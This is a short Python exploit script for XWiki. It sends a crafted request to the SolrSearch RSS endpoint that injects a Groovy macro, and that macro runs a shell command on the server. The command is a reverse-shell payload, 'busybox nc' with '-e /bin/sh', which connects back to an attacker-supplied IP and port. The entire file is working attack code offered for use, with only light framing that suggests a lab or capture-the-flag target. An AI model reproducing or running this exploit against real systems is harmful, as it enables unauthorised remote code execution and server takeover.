#!/usr/bin/env python3

import argparse
import urllib.parse
import requests

def main():
    parser = argparse.ArgumentParser(description="XWiki Groovy RCE exploit with reverse shell prep")
    parser.add_argument("target", help="Target base URL (example: http://10.10.10.10)")
    parser.add_argument("lhost", help="the attacker IP")
    parser.add_argument("lport", help="the attackr port")
    args = parser.parse_args()

    target_url = args.target.rstrip("/")

    callback_ip = args.lhost
    callback_port = args.lport
    
    # Reverse shell payload
    reverse_shell_payload = f"busybox nc {callback_ip} {callback_port} -e /bin/sh"
    print(f"[+] Reverse shell payload: {reverse_shell_payload}")

    # URL encode payload
    reverse_shell_encoded = urllib.parse.quote(reverse_shell_payload)

    # Groovy injection URL
    exploit_path = (
        "/xwiki/bin/get/Main/SolrSearch"
        "?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d"
        "%7b%7bgroovy%7d%7dprintln(%22"
        f"{reverse_shell_encoded}"
        "%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
    )

    exploit_url = target_url + exploit_path

    print(f"[+] Sending exploit to: {exploit_url}")

    try:
        r = requests.get(exploit_url, timeout=10)
        print("[+] Request sent")
        print(f"[+] HTTP status: {r.status_code}")
    except Exception as e:
        print(f"[!] Request failed: {e}")


if __name__ == "__main__":
    main()